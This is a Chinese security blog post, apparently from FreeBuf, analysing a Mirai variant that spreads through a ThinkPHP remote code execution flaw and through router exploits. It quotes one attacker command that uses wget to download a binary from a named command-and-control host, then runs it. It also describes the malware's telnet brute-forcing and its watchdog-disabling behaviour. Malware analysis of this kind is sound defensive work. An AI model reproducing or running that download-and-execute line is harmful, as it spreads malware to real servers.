***本文原创作者：kczwa1，本文属于FreeBuf原创奖励计划，未经许可禁止转载**  

## 一、概述

**12月底，通过安全设备检测到几个不同的IP试图对几个公司内部的网站进行漏洞攻击。通过攻击日志发现攻击IP使用了于2018年12月12日爆出的ThinkPHP远程代码执行漏洞（CNVD-2018-24942），攻击者利用该漏洞，可在未授权的情况下远程执行代码。**

下图为攻击日志：

![图片.png](https://image.3001.net/images/20190114/1547435779_5c3bff030895b.png!small)攻击者试图在被攻击服务器上执行如下命令：

    
    
    ‘Cd /tmp;wget http://cnc.junoland.xyz/bins/egg.x86;cat egg.x86> lzrd;chmod 777 lzrd;./lzrd ‘

同时从该恶意文件存放网站上还发现了arm，mips，mipsl等不同cpu架构版本的病毒：

![图片.png](https://image.3001.net/images/20190114/1547447070_5c3c2b1e402f4.png!small)获取egg.x86文件后，截止测试时，根据virustotal网站信息，暂无国内安全公司识别该文件为病毒，如下图所示：

![图片.png](https://image.3001.net/images/20190114/1547447124_5c3c2b541249c.png!small)此文件应该是Mirari病毒的一种新变种，保留了传统Mirari特征，试图通过最新的thinkphp漏洞来收割一波服务器肉鸡，比起之前的mirari只攻击IOT设备，这个文件的目标范围扩大了不少。

## 二、病毒分析

由于体力原因，并未分析完所有的功能。  

该病毒为了躲避静态分析，并不直接从库函数libc里面调用系统函数，导入表为空：

![图片.png](https://image.3001.net/images/20190114/1547447291_5c3c2bfbaa766.png!small)

所有的系统调用都采用int 80h
[Linux系统](https://www.baidu.com/s?wd=Linux%E7%B3%BB%E7%BB%9F&tn=SE_PcZhidaonwhc_ngpagmjz&rsv_dl=gh_pc_zhidao)软中断调用组合系统调用号的方式实现，如下图：

![图片.png](https://image.3001.net/images/20190114/1547447328_5c3c2c20170e3.png!small)注释后的关键结构代码如下：

![图片.png](https://image.3001.net/images/20190114/1547447604_5c3c2d3490141.png!small)![图片.png](https://image.3001.net/images/20190114/1547447614_5c3c2d3e09426.png!small)

包含了漏洞扫描模块和结束模块，代码结构与mirai 类似。

listen_43824模块会打开本地网络监听端口43824：

![图片.png](https://image.3001.net/images/20190114/1547448370_5c3c30327c7e4.png!small)

![图片.png](https://image.3001.net/images/20190114/1547448364_5c3c302c2d62d.png!small)telnet_brute_force模块，扫描随机IP的telnet服务是否打开，telnet服务在路由器等IOT设备上应用较多，目的IP根据系统时间和进程号进行计算生成：  

![图片.png](https://image.3001.net/images/20190114/1547448359_5c3c3027c4d62.png!small)

抓取流量包后发现扫描行为如下：

![图片.png](https://image.3001.net/images/20190114/1547448354_5c3c30228dfd5.png!small)

在进行逆向调试时，成功扫描到某IP开放了23端口telnet服务，从返回信息看该IP为一台华为家用路由器，如下图所示：

![图片.png](https://image.3001.net/images/20190114/1547448346_5c3c301a5180b.png!small)

当扫描到目的IP开放telnet服务后，开始使用弱口令尝试爆破扫描出的telnet服务。在内存中发现病毒自带的一份弱口令密码表，如图下图所示，这个样本采用少量的密码字典，因为大范围的扫描公网IP字典少扫描效率相对较高，同时由于攻击目标为IOT的Telnet服务，这个服务经常用一些很简单的密码：

![图片.png](https://image.3001.net/images/20190114/1547448326_5c3c3006dc327.png!small)

Linksys_exp模块会扫描随机IP的8080服务是否打开，目的IP根据系统时间和进程号进行计算生成，如图所示：

![图片.png](https://image.3001.net/images/20190114/1547448321_5c3c300128eb7.png!small)下图为通过抓取网络数据发现的对随机IP进行的8080端口扫描行为：

![图片.png](https://image.3001.net/images/20190114/1547448412_5c3c305c07327.png!small)

当扫描到IP开放后则使用漏洞CNVD-2014-01260（Linksys多款路由器 tmUnblock.cgi ttcp_ip
参数远程命令执行漏洞）进行攻击，根据payload内容如果此漏洞攻击成功则会在目标路由器上下载egg.mpsl（此病毒的mpsl版本）并执行，攻击payload如下：

![图片.png](https://image.3001.net/images/20190114/1547448430_5c3c306eab405.png!small)

攻击流量数据如下：

![图片.png](https://image.3001.net/images/20190114/1547448473_5c3c3099a72f4.png!small)

thinkphp_exp模块，跟前面的进程一样进行任意IP端口扫描，发现端口打开后，尝试使用CNVD-2018-24942（ThinkPHP远程代码执行漏洞）进行攻击：

![图片.png](https://image.3001.net/images/20190114/1547448538_5c3c30dadb21e.png!small)dir_exp模块，跟前面的进程一样进行任意IP端口扫描,
发现端口打开后，尝试使用CNVD-2013-09199 （DIR-300, DIR-600, DIR-645, DIR-845和DIR-865UPnP
SOAP接口接口不正确过滤XML参数，允许远程攻击者利用漏洞注入和执行任意命令）进行攻击：

![图片.png](https://image.3001.net/images/20190114/1547448588_5c3c310c3cc12.png!small)

Watchdog_scan模块，由于IOT设备中经常配置看门狗模块以使机器在出现问题时重启，病毒进程在设备重启后将无法启动，因此子进程5尝试在文件系统中打开名为/dev/watchdog，etc/watchdog等的文件，一旦打开成功则篡改其权限让watchdog失效：![图片.png](https://image.3001.net/images/20190114/1547448644_5c3c31441ce45.png!small)

 ***本文原创作者：kczwa1，本文属于FreeBuf原创奖励计划，未经许可禁止转载**

